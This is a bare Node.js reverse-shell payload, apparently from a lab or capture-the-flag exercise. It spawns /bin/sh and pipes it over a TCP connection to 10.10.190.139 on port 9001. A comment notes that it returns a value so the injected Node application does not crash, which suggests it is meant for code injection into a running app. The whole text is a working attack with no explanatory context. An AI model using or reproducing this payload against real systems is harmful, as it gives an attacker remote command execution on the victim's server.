(function(){
    var net = require("net");
        cp = require("child_process");
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(9001, "10.10.190.139", function(){
       client.pipe(sh.stdin);
       sh.stdout.pipe(client);
       sh.stderr.pipe(client);
    });
   return /a/; //Prevents the Nodejs App from crashing

})();
